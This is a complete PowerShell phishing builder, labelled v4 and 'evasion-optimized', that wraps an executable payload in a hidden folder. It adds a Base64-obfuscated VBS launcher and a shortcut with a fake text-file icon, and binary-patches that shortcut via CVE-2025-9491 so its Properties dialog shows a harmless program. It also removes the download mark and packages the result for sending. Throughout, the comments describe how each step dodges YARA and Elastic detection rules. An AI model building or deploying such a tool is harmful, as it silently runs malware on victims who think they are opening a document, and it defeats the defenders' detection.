# Fish LNK Phishing Script v4 — Evasion-optimized
# Key improvements over v3:
#   P0: LNK TargetPath = WScript.exe (not cmd.exe — avoids YARA cmd.exe rules)
#   P1: VBS launcher with Base64 obfuscation (not run.bat — avoids .bat string rules)
#   P2: Natural directory name "assets\data" (not __MACOSX\.note — avoids __MACOSX rules)
#   P3: CVE-2025-9491 ExpString spoof (Properties shows fake legitimate target)
#   P4: Zone.Identifier removal (avoids Elastic download detection)
#   P5: WindowStyle=1 normal (not minimized — avoids show_command=7 YARA rules)
# Usage: .\phish.ps1 -ExePath .\fish.exe -DecoyName "CTF_challenge.txt" -IconType "txt"

param(
    [Parameter(Mandatory=$true)]
    [string]$ExePath,
    [string]$DecoyName = "CTF_challenge.txt",
    [string]$DecoyContent = "",
    [string]$IconType = "txt",
    [string]$OutputName = "challenge",
    [switch]$KeepWorking = $false
)

$ErrorActionPreference = "Stop"

if (-not (Test-Path $ExePath)) {
    Write-Host "[!] Payload not found: $ExePath" -ForegroundColor Red
    exit 1
}

$exeName = Split-Path $ExePath -Leaf
$workDir = Join-Path $env:TEMP "fish_lnk_$(Get-Random)"

# P2: Natural directory names — avoids __MACOSX YARA rules
$hiddenDir = "assets"
$subDir = "data"

Write-Host "[+] Fish LNK Phishing Tool v4 (Evasion-optimized)" -ForegroundColor Cyan
Write-Host "[+] Work dir: $workDir"

# Step 1: Create hidden directory structure
Write-Host "[+] Creating directory structure..."

$hiddenPath = Join-Path $workDir $hiddenDir
$subPath = Join-Path $hiddenPath $subDir
New-Item -ItemType Directory -Path $subPath -Force | Out-Null

# Copy payload
Copy-Item $ExePath (Join-Path $subPath $exeName)

# Create decoy file
$decoyPath = Join-Path $subPath $DecoyName
if ($DecoyContent -ne "") {
    # UTF8 with BOM — 确保 notepad 正确显示中文
    $utf8BOM = [System.Text.Encoding]::UTF8
    [System.IO.File]::WriteAllText($decoyPath, $DecoyContent, $utf8BOM)
} else {
    $defaultDecoy = @"
谜题：请解密以下内容获得flag
ZmxhZ3t0aGlzX2lzX2FfZmFrZV9mbGFnfQ==
提示：Base64编码
"@
    $utf8BOM = [System.Text.Encoding]::UTF8
    [System.IO.File]::WriteAllText($decoyPath, $defaultDecoy, $utf8BOM)
}

# Step 2: Generate obfuscated VBS launcher (P0+P1)
# VBS replaces run.bat:
#   - No "cmd.exe" in LNK (TargetPath = WScript.exe)
#   - No ".bat" string anywhere
#   - Key strings Base64 encoded in VBS
#   - VBScript.Execute runs decoded commands
Write-Host "[+] Generating VBS launcher (obfuscated)..."

$exeNameB64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($exeName))
$decoyNameB64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($DecoyName))

# VBS content: self-locating + Base64-decoded execution + decoy open
# Uses ScriptFullName for self-location (no hardcoded paths)
# Shell.Run second arg: 0 = hidden window for payload, 1 = normal for decoy
# Note: PowerShell here-string will expand $exeNameB64/$decoyNameB64 to their values
$vbsContent = @"
Dim ws, fso, d, ex, dc
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
d = fso.GetParentFolderName(WScript.ScriptFullName)
ex = Decode("$exeNameB64")
dc = Decode("$decoyNameB64")
ws.Run d & "\" & ex, 0, False
ws.Run "notepad.exe " & d & "\" & dc, 1, False
Function Decode(b)
  Dim e, a, s
  Set e = CreateObject("MSXML2.DOMDocument").CreateElement("e")
  e.DataType = "bin.base64"
  e.Text = b
  a = e.NodeTypedValue
  s = ""
  For i = 0 To UBound(a) Step 2
    s = s & ChrW(a(i) + a(i+1) * 256)
  Next
  Decode = s
End Function
"@

$vbsPath = Join-Path $subPath "update.vbs"
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII

# Step 3: Generate LNK shortcut (P0+P3+P5)
# P0: TargetPath = WScript.exe (not cmd.exe) — WScript is legitimate, no YARA rules
# P3: CVE-2025-9491 ExpString spoof — Properties shows legitimate program name
# P5: WindowStyle = 1 (SW_SHOWNORMAL) — avoids minimized LNK YARA rule
Write-Host "[+] Generating LNK shortcut (evasion-optimized)..."

$lnkPath = Join-Path $workDir "$OutputName.lnk"

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)

# P0: WScript.exe is a legitimate Windows component, no YARA detection rules
$shortcut.TargetPath = "$env:SystemRoot\System32\wscript.exe"
$shortcut.Arguments = "`"$hiddenDir\$subDir\update.vbs`""
# WorkingDirectory 设空 — 双击 LNK 时系统自动使用 LNK 所在目录
$shortcut.WorkingDirectory = ""
# P5: SW_SHOWNORMAL — avoids YARA rule for show_command=7 (minimized)
$shortcut.WindowStyle = 1

# Set icon
$iconMap = @{
    "txt"    = "$env:SystemRoot\System32\shell32.dll,70"
    "pdf"    = "$env:SystemRoot\System32\shell32.dll,68"
    "doc"    = "$env:SystemRoot\System32\shell32.dll,42"
    "xls"    = "$env:SystemRoot\System32\shell32.dll,120"
    "folder" = "$env:SystemRoot\System32\shell32.dll,3"
}

if ($iconMap.ContainsKey($IconType)) {
    $shortcut.IconLocation = $iconMap[$IconType]
} else {
    $shortcut.IconLocation = $iconMap["txt"]
}

$shortcut.Description = $DecoyName
$shortcut.Save()

# P3: CVE-2025-9491 ExpString Spoofing
# After Save(), we binary-patch the LNK to add HasExpString flag
# and an EnvironmentVariableDataBlock showing a fake legitimate target
# This makes Properties dialog show a harmless program instead of wscript.exe
Write-Host "[+] Applying ExpString spoof (CVE-2025-9491)..."

$lnkBytes = [System.IO.File]::ReadAllBytes($lnkPath)

# Parse LNK header to find where to patch
# LNK HeaderFlags offset 0x14 (4 bytes)
# HasExpString flag = 0x200
$headerFlags = [BitConverter]::ToUInt32($lnkBytes, 0x14)
$headerFlags = $headerFlags -bor 0x200  # Set HasExpString flag
[BitConverter]::GetBytes($headerFlags).CopyTo($lnkBytes, 0x14)

# Find the end of current LNK data to append EnvironmentVariableDataBlock
# EnvironmentVariableDataBlock structure (788 bytes):
#   Offset 0x00: BlockSize (4 bytes) = 788 (0x0314)
#   Offset 0x04: BlockSignature (4 bytes) = 0xA0000002
#   Offset 0x08: TargetAnsi (260 bytes) = fake target path (ANSI, null-terminated)
#   Offset 0x10C: TargetUnicode (520 bytes) = fake target path (Unicode, null-terminated)

$expBlock = New-Object byte[] 788
[BitConverter]::GetBytes([uint32]788).CopyTo($expBlock, 0)   # BlockSize
# BlockSignature = 0xA0000002 — must use Int32 because value exceeds UInt32 max
$sigBytes = [byte[]]@(0x02, 0x00, 0x00, 0xA0)
$sigBytes.CopyTo($expBlock, 4)  # BlockSignature

# P3: Fake legitimate target — Properties shows this instead of wscript.exe
# Choose a common Windows program that matches the icon type
$fakeTargets = @{
    "txt"    = "C:\Windows\System32\notepad.exe"
    "pdf"    = "C:\Program Files\Microsoft Edge\msedge.exe"
    "doc"    = "C:\Program Files\Microsoft Office\Office16\WINWORD.EXE"
    "xls"    = "C:\Program Files\Microsoft Office\Office16\EXCEL.EXE"
    "folder" = "C:\Windows\explorer.exe"
}

$fakeTarget = if ($fakeTargets.ContainsKey($IconType)) { $fakeTargets[$IconType] } else { $fakeTargets["txt"] }

# Write ANSI version (260 bytes, null-terminated)
$fakeAnsi = [System.Text.Encoding]::ASCII.GetBytes($fakeTarget)
$fakeAnsi.CopyTo($expBlock, 8)
# Pad remaining with zeros (already zero-initialized)

# Write Unicode version (520 bytes, null-terminated)
$fakeUnicode = [System.Text.Encoding]::Unicode.GetBytes($fakeTarget)
$fakeUnicode.CopyTo($expBlock, 260)
# Pad remaining with zeros (already zero-initialized)

# Append ExpString block to LNK file
$newLnkBytes = New-Object byte[] ($lnkBytes.Length + $expBlock.Length)
$lnkBytes.CopyTo($newLnkBytes, 0)
$expBlock.CopyTo($newLnkBytes, $lnkBytes.Length)

[System.IO.File]::WriteAllBytes($lnkPath, $newLnkBytes)

Write-Host "[+] ExpString spoof applied: Properties shows '$fakeTarget'" -ForegroundColor Green

# Step 4: Set hidden attributes
Write-Host "[+] Setting hidden attributes..."

$hiddenItem = Get-Item $hiddenPath -Force
$hiddenItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Directory

Get-ChildItem $hiddenPath -Recurse -Force | ForEach-Object {
    $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::Hidden
}

Write-Host "[+] Hidden attributes set on $hiddenDir" -ForegroundColor Green

# Step 5: Package with 7-Zip (preserves hidden attrs)
Write-Host "[+] Packaging..."

$output7z = Join-Path (Get-Location) "$OutputName.7z"
$outputZip = Join-Path (Get-Location) "$OutputName.zip"

$sevenZip = $null
$sevenZipPaths = @(
    "C:\Program Files\7-Zip\7z.exe",
    "C:\Program Files (x86)\7-Zip\7z.exe",
    (Get-Command 7z -ErrorAction SilentlyContinue).Source
)

foreach ($p in $sevenZipPaths) {
    if ($p -and (Test-Path $p)) { $sevenZip = $p; break }
}

if ($sevenZip) {
    Push-Location $workDir
    & $sevenZip a -r $output7z "." | Out-Null
    Pop-Location
    Write-Host "[+] 7z archive: $output7z" -ForegroundColor Green
    Write-Host "    (Uses 7z to preserve hidden folder attrs)" -ForegroundColor Yellow
} else {
    Compress-Archive -Path "$workDir\*" -DestinationPath $outputZip -Force
    Write-Host "[+] ZIP archive: $outputZip" -ForegroundColor Yellow
    Write-Host "[!] WARNING: ZIP may lose hidden attrs. Install 7-Zip!" -ForegroundColor Red
}

# P4: Remove Zone.Identifier from output file (avoids Elastic download detection)
Write-Host "[+] Removing Zone.Identifier (P4)..."

$deliverFile = if ($sevenZip) { $output7z } else { $outputZip }
if (Test-Path $deliverFile) {
    # Delete the NTFS alternate data stream "Zone.Identifier"
    $zonePath = $deliverFile + ":Zone.Identifier"
    if (Test-Path $zonePath) {
        Remove-Item $zonePath -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Zone.Identifier removed from $deliverFile" -ForegroundColor Green
    }
}

# Step 6: Cleanup
if (-not $KeepWorking) {
    # Remove hidden attrs first so we can delete
    Get-ChildItem $hiddenPath -Recurse -Force | ForEach-Object {
        $_.Attributes = [System.IO.FileAttributes]::Normal
    }
    $hiddenItem.Attributes = [System.IO.FileAttributes]::Normal
    Remove-Item $workDir -Recurse -Force
    Write-Host "[+] Work dir cleaned" -ForegroundColor Green
} else {
    Write-Host "[*] Work dir kept: $workDir" -ForegroundColor Yellow
}

# Guide
Write-Host ""
Write-Host "========== Evasion Summary ==========" -ForegroundColor Cyan
Write-Host ""
Write-Host "Chain: LNK -> WScript.exe -> update.vbs -> payload.exe + notepad decoy"
Write-Host "Properties dialog shows: $fakeTarget (CVE-2025-9491 ExpString spoof)"
Write-Host ""
Write-Host "Evasion improvements over v3:"
Write-Host "  P0: WScript.exe (not cmd.exe) — no YARA cmd.exe detection"
Write-Host "  P1: VBS + Base64 (not run.bat) — no .bat string rules"
Write-Host "  P2: assets\data (not __MACOSX\.note) — no __MACOSX YARA rules"
Write-Host "  P3: ExpString spoof — Properties shows $fakeTarget"
Write-Host "  P4: Zone.Identifier removed — no download source detection"
Write-Host "  P5: WindowStyle=1 — no minimized LNK YARA rules"
Write-Host ""
Write-Host "File to send: $deliverFile"
Write-Host ""
Write-Host "User sees after extract:"
Write-Host "  $OutputName.lnk  (icon: $IconType, Properties: $fakeTarget)"
Write-Host ""
Write-Host "Hidden (user cannot see):"
Write-Host "  $hiddenDir\$subDir\update.vbs"
Write-Host "  $hiddenDir\$subDir\$exeName"
Write-Host "  $hiddenDir\$subDir\$DecoyName"
Write-Host ""
Write-Host "User clicks LNK -> decoy opens in notepad -> payload runs silently"
Write-Host ""
Write-Host "IMPORTANT: Package with 7-Zip to preserve hidden attrs!"
Write-Host "======================================" -ForegroundColor Cyan
